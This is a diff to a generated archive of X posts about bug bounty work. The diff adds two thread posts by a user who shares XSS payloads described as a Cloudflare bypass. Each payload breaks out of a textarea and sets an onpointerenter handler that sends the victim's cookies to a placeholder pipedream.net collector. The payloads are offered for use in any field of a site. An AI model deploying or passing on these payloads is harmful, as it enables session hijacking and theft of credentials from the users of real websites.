@@ -2,7 +2,7 @@
 
 _Generated 2026-11-11 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 132
+- Posts in this file: 134
 - Conversations/threads: 103
 - Oldest post captured: 2018-11-24
 - Newest post captured: 2026-11-03
@@ -1441,7 +1441,7 @@ Tags (automatic): XSS
 
 ---
 
-## 2024-03-21 · Post · So here is the payload, you can use it in any field if site using Cloudflare. It's better for Blind 
+## 2024-03-21 · Thread · So here is the payload, you can use it in any field if site using Cloudflare. It's better for Blind 
 
 
 Tags (automatic): XSS
@@ -1457,6 +1457,22 @@ Tags (automatic): XSS
 > See the Thread Below 👇
 >
 > #BugBounty #bugbountytips #cloudflarebypass
+
+
+### Thread part 2 — @Assass1nmarcos — 2024-03-21 07:58 UTC (2024-03-21 08:58 WAT)
+
+- URL: https://x.com/Assass1nmarcos/status/1770721735324704885
+- Metrics (at fetch): bookmark 10, impression 764, like 11, quote 0, reply 2, retweet 0
+
+> Payload  1:- XSS"&gt;&lt;/textarea&gt;&lt;/body&gt;&lt;body onControl bnsddnedss hello onpointerenter=(location=`https://&lt;yourpipedream&gt;.m.pipedream.net?t=`+cookie) &gt; cookie
+
+
+### Thread part 3 — @Assass1nmarcos — 2024-03-21 07:58 UTC (2024-03-21 08:58 WAT)
+
+- URL: https://x.com/Assass1nmarcos/status/1770721738709508100
+- Metrics (at fetch): bookmark 8, impression 609, like 10, quote 0, reply 0, retweet 0
+
+> Payload 2: '\"&gt;&lt;/textarea&gt;&lt;/body&gt;&lt;body onControl jhjhjshhs hello onpointerenter=(location=`https://&lt;yourdomain&gt;.m.pipedream.net?c=`%2bcookie) 1&gt;cookie
 
 
 ---
